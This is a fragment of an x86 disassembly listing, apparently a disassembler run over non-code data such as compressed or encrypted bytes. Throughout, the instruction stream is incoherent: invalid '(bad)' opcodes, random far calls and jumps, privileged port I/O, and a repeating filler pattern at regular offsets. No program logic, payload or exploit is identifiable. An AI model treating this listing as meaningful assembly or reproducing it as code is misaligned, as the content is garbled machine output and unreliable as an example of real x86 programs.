  42209f:	jmp    0x422050
  4220a1:	sti    
	...
  4220ae:	cmp    BYTE PTR [edx-0x6a],ch
  4220b1:	add    edx,esi
  4220b3:	(bad)  
  4220b4:	mov    ebp,0xdb4ef67b
  4220b9:	out    0xf7,eax
  4220bb:	jmp    0xd85b47c9
  4220c0:	add    DWORD PTR [eax],eax
  4220c2:	pop    esp
  4220c3:	add    BYTE PTR [eax],al
  4220c5:	add    BYTE PTR [edx+0x165058ad],al
  4220cb:	retf   
  4220cc:	inc    esp
  4220cd:	fcom   DWORD PTR [ecx+0x2d2a3dd6]
  4220d3:	sub    al,0x62
  4220d5:	push   ds
  4220d6:	and    eax,0xd433c587
  4220db:	ret    0x53ac
  4220de:	stos   DWORD PTR es:[edi],eax
  4220df:	add    cl,BYTE PTR [edx-0x639dbd19]
  4220e5:	push   eax
  4220e6:	call   0x2d14:0xf3fbe84b
  4220ed:	sbb    esp,0x94fadea0
  4220f3:	ja     0x422137
  4220f5:	fdiv   QWORD PTR [ebx-0x44]
  4220f8:	sub    al,0x7c
  4220fa:	or     DWORD PTR [esi-0x4568c5ed],esp
  422100:	sub    eax,0xaf9f9996
  422105:	pop    edx
  422106:	pop    ecx
  422107:	mov    ebp,0x308efae5
  42210c:	int3   
  42210d:	adc    esi,DWORD PTR [edx+0x6e]
  422110:	rol    BYTE PTR [ebp-0x43],0xcb
  422114:	mov    bh,0x47
  422116:	xchg   esi,eax
  422117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422118:	pop    ds
  422119:	xchg   esp,eax
  42211a:	fld    TBYTE PTR [edx+0x47]
  42211d:	sbb    eax,0xee745cc8
	...
  42212e:	jmp    0x7a729bec
  422133:	repz jmp 0x42212f
  422136:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42213a:	(bad)  
  42213b:	out    dx,al
  42213c:	mul    ah
  42213e:	jne    0x422118
  422140:	add    DWORD PTR [eax],eax
  422142:	pop    esp
  422143:	add    BYTE PTR [eax],al
  422145:	add    ch,al
  422147:	cmp    BYTE PTR [ebx-0x339af571],bl
  42214d:	xor    dl,bh
  42214f:	xchg   edi,eax
  422150:	adc    eax,0xd7a6a7ba
  422155:	js     0x42214f
  422157:	mov    al,0xbf
  422159:	mov    esi,0x53f18263
  42215e:	loopne 0x4221bb
  422160:	loope  0x42212f
  422162:	adc    DWORD PTR [eax+0x3838bf0d],ecx
  422168:	les    eax,FWORD PTR [edi]
  42216a:	jbe    0x42218a
  42216c:	idiv   cl
  42216e:	mov    BYTE PTR [esi-0x6d],ch
  422171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422172:	(bad)  
  422173:	add    DWORD PTR [bp+di],edx
  422176:	loope  0x422193
  422178:	and    eax,ebx
  42217a:	add    DWORD PTR [esi-0x7f65c2f1],edx
  422180:	jnp    0x42214a
  422182:	call   0x39f0:0xbaaaa7cc
  422189:	stos   BYTE PTR es:[edi],al
  42218a:	clc    
  42218b:	push   0x8591c010
  422190:	inc    esp
  422191:	icebp  
  422192:	sbb    edx,DWORD PTR ss:[eax-0x52]
  422196:	bound  eax,QWORD PTR [edi+edx*1-0x2b]
  42219a:	adc    ebp,DWORD PTR ds:0xd881b619
  4221a0:	clc    
  4221a1:	loopne 0x4221a3
	...
  4221ab:	add    BYTE PTR [eax],al
  4221ad:	add    BYTE PTR [ebx+0x41],bl
  4221b0:	pop    ebx
  4221b1:	iret   
  4221b2:	pop    ebx
  4221b3:	(bad)  
  4221b5:	aad    0xf
  4221b7:	ss dec esp
  4221b9:	dec    esi
  4221ba:	stos   BYTE PTR es:[edi],al
  4221bb:	scas   eax,DWORD PTR es:[edi]
  4221bc:	repz mov ecx,0x1d8d1
  4221c2:	pop    esp
  4221c3:	add    BYTE PTR [eax],al
  4221c5:	add    BYTE PTR [ebp+0x51],dl
  4221c8:	imul   edi,DWORD PTR [esi],0x79
  4221cb:	inc    ebx
  4221cc:	push   ds
  4221cd:	add    BYTE PTR [ecx+0x3792d6e5],bh
  4221d3:	test   eax,0x288ea184
  4221d8:	das    
  4221d9:	push   ds
  4221da:	sub    DWORD PTR [edi],esp
  4221dc:	aas    
  4221dd:	pusha  
  4221de:	ins    DWORD PTR es:[edi],dx
  4221df:	leave  
  4221e0:	add    DWORD PTR [edx-0xb],0x31cfacdc
  4221e7:	call   FWORD PTR [ecx+0x5d]
  4221ea:	sub    eax,0x9f8ac695
  4221ef:	cwde   
  4221f0:	push   edx
  4221f1:	and    dl,BYTE PTR [ecx]
  4221f3:	inc    edx
  4221f4:	xor    al,BYTE PTR [ebx]
  4221f6:	or     al,bl
  4221f8:	mov    al,dl
  4221fa:	ds je  0x4221ea
  4221fd:	int3   
  4221fe:	pop    esi
  4221ff:	adc    BYTE PTR [ebx-0x54],al
  422202:	mov    ecx,0xe7326f4a
  422207:	ss (bad) 
  42220a:	aad    0xff
  42220c:	fdivr  QWORD PTR [edi-0x4c]
  42220f:	ss fwait
  422211:	mov    eax,0x2432443f
  422216:	aad    0xf9
  422218:	test   ax,0x997e
  42221c:	push   edi
  42221d:	mov    edx,0x2d9d9048
	...
  42222e:	fwait
  42222f:	test   DWORD PTR [ebp+0x3c],esp
  422232:	jg     0x422230
  422234:	(bad)  [edi-0x65be08a1]
  42223a:	or     al,BYTE PTR [eax]
  42223c:	push   ss
  42223d:	das    
  42223e:	sub    eax,0x5c0001d9
  422243:	add    BYTE PTR [eax],al
  422245:	add    BYTE PTR ds:0x4faf0ddc,bl
  42224b:	sbb    al,0x79
  42224d:	lea    eax,[edi]
  42224f:	xor    ah,BYTE PTR [esi]
  422251:	in     eax,0xc1
  422253:	sar    BYTE PTR [esi],cl
  422255:	jecxz  0x422216
  422257:	jne    0x422205
  422259:	stc    
  42225a:	sub    DWORD PTR [ebp-0x9],ebp
  42225d:	out    dx,eax
  42225e:	jl     0x4222a0
  422260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422261:	stc    
  422262:	mov    ebp,es
  422264:	(bad)  
  422266:	jb     0x42223d
  422268:	in     al,0xe3
  42226a:	cli    
  42226b:	sub    BYTE PTR [ecx+0x56],0xa4
  42226f:	fnstenv [ebx]
  422271:	dec    esp
  422272:	test   ebp,esp
  422274:	popa   
  422275:	mov    ah,0xce
  422277:	rol    BYTE PTR [ecx+0x37cb05bb],0x3f
  42227e:	mov    ch,0xc2
  422280:	jecxz  0x42229b
  422282:	test   BYTE PTR [ecx+0x646f69bf],ch
  422288:	lods   eax,DWORD PTR ds:[esi]
  422289:	mov    ecx,0xaf85eac1
  42228e:	mov    dh,0x83
  422290:	xor    edx,DWORD PTR [ebp+0x3b]
  422293:	push   cs
  422294:	mov    ecx,0xb6d5a7ff
  422299:	mov    ch,0x4
  42229b:	fcmovu st,st(7)
  42229d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42229e:	add    di,WORD PTR [esi+ebp*1+0x0]
	...
  4222ae:	outs   dx,BYTE PTR ds:[esi]
  4222af:	jae    0x4222a1
  4222b1:	retf   0xcbfd
  4222b4:	jle    0x4222ad
  4222b6:	repz xor eax,0xd93e8ce9
  4222bc:	pop    esp
  4222bd:	test   eax,0x1d989
  4222c2:	pop    esp
  4222c3:	add    BYTE PTR [eax],al
  4222c5:	add    BYTE PTR [ecx-0x5],bh
  4222c8:	add    eax,0x3a58d6bd
  4222cd:	mov    bh,0x41
  4222cf:	jge    0x4222a9
  4222d1:	div    DWORD PTR ds:0x341cc3c6
  4222d7:	cmp    BYTE PTR [ebx+eiz*8+0x1],0x3f
  4222dc:	ins    DWORD PTR es:[edi],dx
  4222dd:	mov    esi,0xe94ef269
  4222e2:	mov    esp,0x58362a0f
  4222e7:	icebp  
  4222e8:	retf   0x250c
  4222eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222ec:	xchg   BYTE PTR [ebx-0x7a84b648],al
  4222f2:	sti    
  4222f3:	fbstp  TBYTE PTR [ebx-0x59c1df00]
  4222f9:	aad    0x82
  4222fb:	bound  esp,QWORD PTR [edi-0x4f07b993]
  422301:	cmc    
  422302:	mov    ch,0x83
  422304:	push   cs
  422305:	dec    eax
  422306:	lahf   
  422307:	ds inc edi
  422309:	cli    
  42230a:	adc    ah,bh
  42230c:	jbe    0x422361
  42230e:	sub    eax,0x5c96f202
  422313:	jp     0x422312
  422315:	pop    ebp
  422316:	rcl    DWORD PTR [eax-0x7462ed8a],0x57
  42231d:	push   ds
  42231e:	call   0x6ab9fb
	...
  42232b:	add    BYTE PTR [eax],al
  42232d:	add    ch,dh
  42232f:	adc    al,0xae
  422331:	adc    ebp,edi
  422333:	mov    ebx,0x84e6f6fd
  422338:	lds    ebp,FWORD PTR [edx+0x161536c]
  42233e:	in     eax,0xd9
  422340:	add    DWORD PTR [eax],eax
  422342:	pop    esp
  422343:	add    BYTE PTR [eax],al
  422345:	add    dl,al
  422347:	jecxz  0x42232e
  422349:	inc    edx
  42234a:	dec    eax
  42234b:	imul   esp,DWORD PTR [esi],0x6e
  42234e:	jns    0x4222ec
  422350:	retf   
  422351:	fs pop ds
  422353:	sbb    al,0xf0
  422355:	inc    ebp
  422356:	sub    eax,0x2ec642e
  42235b:	sti    
  42235c:	xchg   DWORD PTR [ecx],ebx
  42235e:	ret    
  42235f:	mov    BYTE PTR [edi],bh
  422361:	test   al,0x92
  422363:	mov    dh,0x91
  422365:	fadd   st,st(2)
  422367:	or     bh,BYTE PTR [edx+0x46fc8b1f]
  42236d:	(bad)  
  42236e:	fcomp  DWORD PTR [esp+ebp*2]
  422371:	pop    ecx
  422372:	add    BYTE PTR [eax+0x5a3f43af],0xc4
  422379:	cmp    ah,BYTE PTR [ecx]
  42237b:	retf   0x2b0c
  42237e:	cmp    al,0xb
  422380:	jo     0x4223a7
  422382:	add    ebp,DWORD PTR [edi+0x9]
  422385:	jge    0x422405
  422387:	pop    es
  422388:	jo     0x4223ec
  42238a:	mov    ebx,0x8d40a239
  42238f:	mov    ds:0xdf204ec1,al
  422394:	repnz push esi
  422396:	in     eax,0x9e
  422398:	mov    DWORD PTR [edi],esi
  42239a:	cli    
  42239b:	(bad)  
  42239c:	push   ebp
  42239d:	sbb    eax,0x1cb6990d
	...
  4223ae:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4223b4:	mov    edi,0xbb1c16fb
  4223b9:	shl    BYTE PTR [edi-0x35],0x67
  4223bd:	push   esi
  4223be:	inc    ecx
  4223bf:	fiadd  DWORD PTR [ecx]
  4223c1:	add    BYTE PTR [eax+eax*1+0x0],bl
  4223c5:	add    BYTE PTR [ecx],al
  4223c7:	inc    esi
  4223c8:	sti    
  4223c9:	jmp    0x849b3b1b
  4223ce:	cld    
  4223cf:	retf   0xdf4
  4223d2:	cmp    ecx,DWORD PTR [ebp+0x4e]
  4223d5:	call   0xb54ecd75
  4223da:	push   cs
  4223db:	sub    eax,0xa102ad91
  4223e0:	xor    esp,ebx
  4223e2:	fmul   DWORD PTR [eax]
  4223e4:	fs retf 
  4223e6:	adc    DWORD PTR [ecx+0x0],edi
  4223e9:	xlat   BYTE PTR ds:[ebx]
  4223ea:	sar    DWORD PTR [ebp-0x5fc5241d],0xe
  4223f1:	fiadd  WORD PTR [eax]
  4223f3:	inc    ebp
  4223f4:	mov    fs,WORD PTR [esi+0x5f219c7]
  4223fa:	test   DWORD PTR [ebp+0x57],esi
  4223fd:	and    al,0xc1
  4223ff:	sar    eax,0xdc
  422402:	ret    
  422403:	jns    0x4223c2
  422405:	popf   
  422406:	mov    ebp,0x9ecc6f14
  42240b:	sar    BYTE PTR [edx],0x9d
  42240e:	dec    ecx
  42240f:	fsubp  st(2),st
  422411:	je     0x422463
  422413:	adc    eax,0x17b126c9
  422418:	lea    ebx,[esi]
  42241a:	jno    0x4223e1
  42241c:	pop    eax
  42241d:	(bad)  
  42241e:	loopne 0x4223e1
  422420:	neg    edi
	...
  42242e:	aam    0xf
  422430:	push   ecx
  422431:	lock (bad) 
  422434:	cmc    
  422435:	das    
  422436:	sbb    BYTE PTR [eax],cl
  422438:	xchg   ebx,eax
  422439:	iret   
  42243a:	and    eax,0x9d880138
  42243f:	fiadd  DWORD PTR [ecx]
  422441:	add    BYTE PTR [eax+eax*1+0x0],bl
  422445:	add    BYTE PTR [ebx-0xc],bh
  422448:	mov    dl,0xc5
  42244a:	out    dx,al
  42244b:	popf   
  42244c:	aas    
  42244d:	pop    eax
  42244e:	dec    esi
  42244f:	cmp    BYTE PTR [ebx+0x4b463967],dh
  422455:	mov    ah,0x9d
  422457:	retf   
  422458:	jge    0x42243c
  42245a:	sub    eax,0xd2fa4d3a
  42245f:	pushf  
  422460:	xlat   BYTE PTR ds:[ebx]
  422461:	inc    esp
  422462:	or     bh,ch
  422464:	xchg   ebp,eax
  422465:	pop    ebp
  422466:	and    esp,0x8a4e75fc
  42246c:	mov    ?,WORD PTR [edi+esi*2-0x11cc6916]
  422473:	ja     0x4224b2
  422475:	lods   al,BYTE PTR ds:[esi]
  422476:	add    BYTE PTR [eax],0xbf
  422479:	mov    esi,0x11c3e380
  42247e:	fmul   DWORD PTR [eax+0x5c]
  422481:	cdq    
  422482:	cmp    eax,0x6d405fcc
  422487:	ret    0xff20
  42248a:	push   es
  42248b:	imul   ebx,DWORD PTR [ebx+0x398c23a8],0x7e
  422492:	retf   0x7a60
  422495:	test   DWORD PTR [edi],edi
  422497:	and    ecx,DWORD PTR [ebx-0x144f7bbe]
  42249d:	(bad)  [ebx+0x51]
  4224a0:	cmp    al,0x4c
	...
  4224ae:	int    0x2d
  4224b0:	xchg   ebp,eax
  4224b1:	inc    ebx
  4224b2:	cmc    
  4224b3:	sti    
  4224b4:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4224ba:	mov    eax,ds:0xf9da8667
  4224bf:	fiadd  DWORD PTR [ecx]
  4224c1:	add    BYTE PTR [eax+eax*1+0x0],bl
  4224c5:	add    BYTE PTR [ebx-0x65e17409],bh
  4224cb:	popa   
  4224cc:	(bad)  
  4224cd:	push   cs
  4224ce:	inc    esp
  4224cf:	adc    DWORD PTR [ebp-0x17],ebx
  4224d2:	or     al,0x10
  4224d4:	ret    0x894c
  4224d7:	mov    DWORD PTR [edi-0x5f],eax
  4224da:	scas   eax,DWORD PTR es:[edi]
  4224db:	push   eax
  4224dc:	add    esi,0xc2b741c4
  4224e2:	mov    al,ds:0xcf3b616c
  4224e7:	jmp    0xdfd7a0f
  4224ec:	xlat   BYTE PTR ds:[ebx]
  4224ed:	in     al,dx
  4224ee:	push   0xc410ae95
  4224f3:	adc    eax,0x69b21f8d
  4224f8:	adc    dh,BYTE PTR [edx+0x2d]
  4224fb:	jle    0x4224f9
  4224fd:	ficom  WORD PTR [edi+esi*1]
  422500:	jl     0x42248d
  422502:	mov    esp,0xa9304d3e
  422507:	dec    edx
  422508:	and    DWORD PTR [eax-0x73],eax
  42250b:	push   cs
  42250c:	dec    eax
  42250d:	dec    esi
  42250e:	add    al,0xcd
  422510:	jmp    0x42253d
  422512:	push   0x1b
  422514:	mov    cl,BYTE PTR [edi]
  422516:	stos   BYTE PTR es:[edi],al
  422517:	out    0xf1,eax
  422519:	jecxz  0x422575
  42251b:	push   esi
  42251c:	cmp    dh,BYTE PTR [esi-0x1ada1a72]
	...
  42252e:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422532:	test   DWORD PTR [ebx-0xce58301],0x77a54cfc
  42253c:	sar    BYTE PTR [edi+0x1db55],cl
  422542:	pop    esp
  422543:	add    BYTE PTR [eax],al
  422545:	add    BYTE PTR [edx],ch
  422547:	fisttp DWORD PTR [ecx+0x2a]
  42254a:	int3   
  42254b:	sub    BYTE PTR [esi+0x69],al
  42254e:	rcl    bh,0x71
  422551:	mov    esi,DWORD PTR [edx+0x4]
  422554:	outs   dx,BYTE PTR ds:[esi]
  422555:	pminub mm6,QWORD PTR [edi-0x41824628]
  42255c:	popa   
  42255d:	push   eax
  42255e:	dec    ebx
  42255f:	xor    al,0xd8
  422561:	adc    BYTE PTR [eax],cl
  422563:	mov    bh,0x10
  422565:	iret   
  422566:	add    dh,dl
  422568:	xor    al,BYTE PTR [ecx+0x1d6c40af]
  42256e:	mov    esp,0xad1246c9
  422573:	xchg   ebp,esi
  422575:	ss sub al,0x2f
  422578:	icebp  
  422579:	mov    eax,ds:0x8b8461ba
  42257e:	hlt    
  42257f:	inc    esi
  422580:	and    eax,0x9948dba6
  422585:	popf   
  422586:	lds    ebp,FWORD PTR [ebx+0x2d1cbec4]
  42258c:	(bad)  
  42258d:	sub    al,0x3b
  42258f:	push   0xffffff9d
  422591:	enter  0x8e92,0xd2
  422595:	es mov ch,0x1
  422598:	mov    ah,0x9e
  42259a:	pop    ebp
  42259b:	ins    DWORD PTR es:[edi],dx
  42259c:	sub    DWORD PTR [ebp-0x67],ebx
  42259f:	push   edx
  4225a0:	es mov dl,0x0
	...
  4225ab:	add    BYTE PTR [eax],al
  4225ad:	add    BYTE PTR [esi],dh
  4225af:	add    dl,BYTE PTR [ebp+0xc]
  4225b2:	jne    0x422613
  4225b4:	jg     0x4225f0
  4225b6:	clc    
  4225b7:	cs aas 
  4225b9:	push   0x882434f9
  4225be:	ror    esi,0x1
  4225c1:	add    BYTE PTR [eax+eax*1+0x0],bl
  4225c5:	add    BYTE PTR [edi-0x7d],bl
  4225c8:	inc    ecx
  4225c9:	stc    
  4225ca:	cmp    dl,BYTE PTR [esp+ecx*8-0x29]
  4225ce:	ret    0x8252
  4225d1:	cmp    bh,BYTE PTR ds:0xa4624d8e
  4225d7:	xchg   edx,eax
  4225d8:	aam    0x83
  4225da:	loop   0x4225b4
  4225dc:	dec    edi
  4225dd:	arpl   WORD PTR [eax-0x462f8d33],ax
  4225e3:	das    
  4225e4:	mov    eax,DWORD PTR [eax-0x2a600e05]
  4225ea:	push   0x4013da20
  4225ef:	inc    esi
  4225f0:	loope  0x422624
  4225f2:	pop    ecx
  4225f3:	(bad)  
  4225f5:	push   edi
  4225f6:	inc    ebp
  4225f7:	fldcw  WORD PTR [edx]
  4225f9:	sub    BYTE PTR [ebp-0x2bc3d239],ah
  4225ff:	sbb    eax,0x31edfbd8
  422604:	jo     0x4225e3
  422606:	add    esi,DWORD PTR [edi-0x2f]
  422609:	and    cl,BYTE PTR ds:0xaf631b83
  42260f:	fwait
  422610:	xchg   DWORD PTR [eax],esi
  422612:	jmp    0x65b3:0xe8ad5218
  422619:	push   esp
  42261a:	sti    
  42261b:	ror    bh,1
  42261d:	push   0xffffffe4
  42261f:	call   0x0:0x608b
	...
  42262e:	or     BYTE PTR [ecx-0x404c48e],dh
  422634:	dec    ecx
  422635:	mov    bl,0x94
  422637:	je     0x422610
  422639:	call   0xcf1d:0xd8ef9cd4
  422640:	add    DWORD PTR [eax],eax
  422642:	pop    esp
  422643:	add    BYTE PTR [eax],al
  422645:	add    BYTE PTR [ecx-0x405dc1e7],dh
  42264b:	adc    ebx,edi
  42264d:	lds    edx,FWORD PTR ds:0x6cdd4c17
  422653:	aas    
  422654:	ret    
  422655:	xchg   ebx,eax
  422656:	call   0x483:0x779fc7e1
  42265d:	repz and al,ch
  422660:	pop    ds
  422661:	jno    0x4226ab
  422663:	int3   
  422664:	sub    ah,al
  422666:	mov    ebp,0x27e1515c
  42266b:	dec    ecx
  42266c:	xlat   BYTE PTR ds:[ebx]
  42266d:	and    DWORD PTR [edx+eax*1+0x1f],edx
  422671:	cmp    BYTE PTR ss:[ecx+0x12ccce02],ch
  422678:	and    DWORD PTR [edi],ebx
  42267a:	dec    eax
  42267b:	push   ebp
  42267c:	push   esi
  42267d:	push   ebp
  42267e:	cmp    BYTE PTR [ebx-0x7d],bh
  422681:	les    esi,FWORD PTR [esi]
  422683:	cmp    eax,0xa3e17058
  422688:	jnp    0x42268a
  42268a:	xor    DWORD PTR [ebx],esi
  42268c:	jmp    0x422683
  42268e:	inc    edx
  42268f:	xor    eax,0xee69ef67
  422694:	ds jbe 0x422708
  422697:	jg     0x422644
  422699:	jo     0x422678
  42269b:	mov    esi,0xd50d3a81
  4226a0:	jnp    0x422677
	...
  4226ae:	fist   WORD PTR [ebx-0x4e]
  4226b1:	dec    edi
  4226b2:	mov    esi,0x67d3ffef
  4226b7:	xchg   ecx,edi
  4226b9:	adc    al,0xdb
  4226bb:	call   0x1:0xcf79b007
  4226c2:	pop    esp
  4226c3:	add    BYTE PTR [eax],al
  4226c5:	add    BYTE PTR [edx+0x37c4f6e7],dh
  4226cb:	mov    bl,bl
  4226cd:	sbb    esi,ecx
  4226cf:	xchg   esp,eax
  4226d0:	xchg   esi,eax
  4226d1:	and    DWORD PTR [esi],edx
  4226d3:	out    dx,al
  4226d4:	adc    ah,bl
  4226d6:	add    DWORD PTR [ecx+edx*8],ecx
  4226d9:	scas   eax,DWORD PTR es:[edi]
  4226da:	inc    edi
  4226db:	and    al,0x5
  4226dd:	xchg   edi,eax
  4226de:	in     eax,0xcf
  4226e0:	es push ebp
  4226e2:	xlat   BYTE PTR ds:[ebx]
  4226e3:	adc    bl,BYTE PTR [edx]
  4226e5:	sub    al,0xe8
  4226e7:	push   ebx
  4226e8:	push   esp
  4226e9:	(bad)  
  4226eb:	inc    esi
  4226ec:	out    0xf6,al
  4226ee:	pmaxub mm6,mm7
  4226f1:	mov    al,ds:0x1367c8cc
  4226f6:	sub    edx,DWORD PTR [eax-0x2a193f2e]
  4226fc:	inc    esi
  4226fd:	push   0x6b
  4226ff:	fs call 0x169f:0x9633e89c
  422707:	push   eax
  422708:	mov    dh,0x22
  42270a:	out    0x12,eax
  42270c:	ret    0x866a
  42270f:	add    DWORD PTR [edi+esi*4+0x56],edi
  422713:	mov    eax,ds:0x8058edd
  422718:	cmp    ah,BYTE PTR [ecx]
  42271a:	in     al,dx
  42271b:	dec    esi
  42271c:	in     eax,0x54
  42271e:	lock adc BYTE PTR [ecx+0xf0],dl
	...
  42272d:	add    BYTE PTR [edi-0x24252cf4],al
  422733:	fisttp WORD PTR [edi+0x640ccb5d]
  422739:	push   ss
  42273a:	xor    DWORD PTR [esi-0x302a310e],eax
  422740:	add    DWORD PTR [eax],eax
  422742:	pop    esp
  422743:	add    BYTE PTR [eax],al
  422745:	add    BYTE PTR [esi+ebp*8-0x6459b25c],al
  42274c:	lods   eax,DWORD PTR ds:[esi]
  42274d:	lods   al,BYTE PTR ds:[esi]
  42274e:	cmp    dl,BYTE PTR [edi-0x57a110c6]
  422754:	or     dh,ah
  422756:	in     eax,dx
  422757:	dec    eax
  422758:	cmp    ah,bl
  42275a:	rol    BYTE PTR [edx-0x167658a9],0xdb
  422761:	and    DWORD PTR [ecx],edi
  422763:	jmp    0x42273c
  422765:	adc    eax,0xbe0d7c42
  42276a:	(bad)  
  42276c:	lahf   
  42276d:	mov    dh,0x92
  42276f:	fnsave [ebx-0x4994a63]
  422775:	(bad)  
  422776:	(bad)  
  422778:	mov    cs,WORD PTR [esi-0x3e926db9]
  42277e:	jle    0x422704
  422780:	or     edi,DWORD PTR [ebp+eax*2+0x47]
  422784:	inc    edi
  422785:	pushf  
  422786:	jae    0x4227ed
  422788:	cmp    DWORD PTR [ebx+eax*2+0x4a],edi
  42278c:	fiadd  DWORD PTR [esi]
  42278e:	jb     0x422711
  422790:	and    DWORD PTR [ebx-0x426c333e],0x1f
  422797:	into   
  422798:	mov    al,ds:0x752a77
  42279d:	outs   dx,BYTE PTR ds:[esi]
  42279e:	add    BYTE PTR [ecx+ebx*8],0xe5
	...
  4227ae:	lahf   
  4227af:	arpl   WORD PTR [ebp+0x72],cx
  4227b2:	std    
  4227b3:	jle    0x422774
  4227b5:	out    dx,eax
  4227b6:	sbb    edi,esp
  4227b8:	mov    BYTE PTR [ebp+esi*2+0x3179e7e1],dh
  4227bf:	rol    BYTE PTR [ecx],1
  4227c1:	add    BYTE PTR [eax+eax*1+0x0],bl
  4227c5:	add    BYTE PTR [ebp-0x4a71e1ad],dh
  4227cb:	sub    al,0x40
  4227cd:	sub    al,0x30
  4227cf:	jae    0x422794
  4227d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227d2:	dec    ebp
  4227d3:	cmp    al,0x7
  4227d5:	and    eax,0x9a9a9070
  4227da:	xchg   esp,eax
  4227db:	fdivr  QWORD PTR [ecx]
  4227dd:	aam    0x2b
  4227df:	jmp    0x42283f
  4227e1:	and    DWORD PTR [esi+0x4839241a],0x8c6f4aba
  4227eb:	mov    al,ds:0x54d02138
  4227f0:	ds pushw ss
  4227f3:	sbb    al,0xd4
  4227f5:	imul   ecx,esp,0x74c80481
  4227fb:	or     al,0xce
  4227fd:	xchg   ebx,eax
  4227fe:	out    dx,eax
  4227ff:	loope  0x4227a2
  422801:	add    edx,edx
  422803:	mov    bl,0x9a
  422805:	pop    esi
  422806:	adc    bl,bh
  422808:	ins    BYTE PTR es:[edi],dx
  422809:	pop    ecx
  42280a:	dec    ebp
  42280b:	or     ecx,DWORD PTR [ecx]
  42280d:	pop    eax
  42280e:	pop    ss
  42280f:	and    ah,bh
  422811:	jg     0x4227ed
  422813:	popa   
  422814:	arpl   si,di
  422816:	into   
  422817:	sbb    al,0x4b
  422819:	mov    DWORD PTR [ecx+0x5cc93f8a],0xe327d9
	...
  42282b:	add    BYTE PTR [eax],al
  42282d:	add    BYTE PTR [eax+0x23],dh
  422830:	and    eax,0x7c6f7769
  422835:	cmp    esp,DWORD PTR [eax-0x64311e4]
  42283b:	xchg   esi,ebx
  42283d:	jl     0x4227cc
  42283f:	rol    BYTE PTR [ecx],1
  422841:	add    BYTE PTR [eax+eax*1+0x0],bl
  422845:	add    BYTE PTR [ebp-0x4ff1cf16],dl
  42284b:	ret    
  42284c:	sub    al,0x81
  42284e:	fist   DWORD PTR [ebp-0x53d20b6d]
  422854:	out    0xc3,eax
  422856:	dec    esp
  422857:	cmp    ebp,DWORD PTR [edi]
  422859:	inc    ebx
  42285a:	add    eax,DWORD PTR [edi-0x55db4cf6]
  422860:	es scas al,BYTE PTR es:[edi]
  422862:	sti    
  422863:	std    
  422864:	xor    al,bh
  422866:	out    dx,al
  422867:	pop    esi
  422868:	mov    esi,0xf9141874
  42286d:	inc    eax
  42286e:	ja     0x42282f
  422870:	xor    al,0xe2
  422872:	ss scas eax,DWORD PTR es:[edi]
  422874:	out    0xfe,eax
  422876:	call   0xa782dc68
  42287b:	xor    BYTE PTR [edx+ebp*1-0xf598eaa],0x26
  422883:	xchg   DWORD PTR [edi],ebp
  422885:	or     eax,edi
  422887:	jmp    0x4de1642d
  42288c:	pop    ebp
  42288d:	mov    DWORD PTR ds:0x3914,eax
  422892:	push   es
  422893:	lods   al,BYTE PTR ds:[esi]
  422894:	in     eax,0x2e
  422896:	sahf   
  422897:	(bad)  
  422898:	mov    eax,ds:0xcee734a2
  42289d:	mov    ds:0x90bddb52,eax
	...
  4228ae:	xchg   esp,eax
  4228af:	nop
  4228b0:	ffree  st(0)
  4228b2:	(bad)  
  4228b4:	popf   
  4228b5:	aam    0x57
  4228b7:	(bad)
  4228bb:	enter  0xee77,0xe9
  4228bf:	rol    BYTE PTR [ecx],1
  4228c1:	add    BYTE PTR [eax+eax*1+0x0],bl
  4228c5:	add    BYTE PTR [edi+eiz*1],dl
  4228c8:	mov    ch,ch
  4228ca:	xchg   ebp,eax
  4228cb:	out    dx,al
  4228cc:	test   al,0xc3
  4228ce:	and    ch,BYTE PTR [ecx+ecx*4+0xd]
  4228d2:	dec    edx
  4228d3:	icebp  
  4228d4:	push   cs
  4228d5:	xbegin 0x56710cb3
  4228db:	aas    
  4228dc:	iret   
  4228dd:	sub    edi,DWORD PTR [ebx]
  4228df:	dec    esi
  4228e0:	cmc    
  4228e1:	arpl   WORD PTR [esi+eiz*2+0x5e24e325],dx
  4228e8:	push   esi
  4228e9:	jb     0x42286c
  4228eb:	mov    ch,ah
  4228ed:	sbb    bh,BYTE PTR [edx+0x4e45a6fa]
  4228f3:	mov    al,0x56
  4228f5:	lock sahf 
  4228f7:	stos   BYTE PTR es:[edi],al
  4228f8:	outs   dx,DWORD PTR ds:[esi]
  4228f9:	mov    ds:0x499ef8b3,al
  4228fe:	(bad)  
  4228ff:	(bad)  
  422900:	jge    0x422949
  422902:	and    esi,DWORD PTR [ebx+0x3c]
  422905:	mov    eax,ds:0xddc01f97
  42290a:	cdq    
  42290b:	adc    bl,dl
  42290d:	jmp    0x42291d
  42290f:	fdiv   st,st(2)
  422911:	ret    0xabf1
  422914:	jl     0x4228c1
  422916:	data16 (bad) 
  422918:	enter  0xe3e4,0xd
  42291c:	mov    bh,0xd2
  42291e:	xchg   ebp,eax
  42291f:	jp     0x422975
  422921:	icebp  
	...
  42292e:	hlt    
  42292f:	mov    dl,0x32
  422931:	(bad)  
  422932:	jbe    0x42290a
  422934:	hlt    
  422935:	mov    dl,0xb1
  422937:	and    al,0xfe
  422939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42293a:	mul    DWORD PTR [eax+0x2c]
  42293d:	cdq    
  42293e:	inc    ebp
  42293f:	rol    DWORD PTR [ecx],1
  422941:	add    BYTE PTR [eax+eax*1+0x0],bl
  422945:	add    BYTE PTR [edi],ah
  422947:	imul   edx,DWORD PTR [ebp+0x61],0x33
  42294b:	add    DWORD PTR [edi+eiz*8],esp
  42294e:	mov    ah,0xe9
  422950:	or     cl,ch
  422952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422953:	je     0x4228e7
  422955:	lods   eax,DWORD PTR ds:[esi]
  422956:	sub    esi,DWORD PTR [esi+edx*2]
  422959:	xor    BYTE PTR [eax+edx*2+0x5a],ah
  42295d:	mov    ecx,0x52447f55
  422962:	xchg   BYTE PTR [edi-0x10bca219],al
  422968:	out    dx,eax
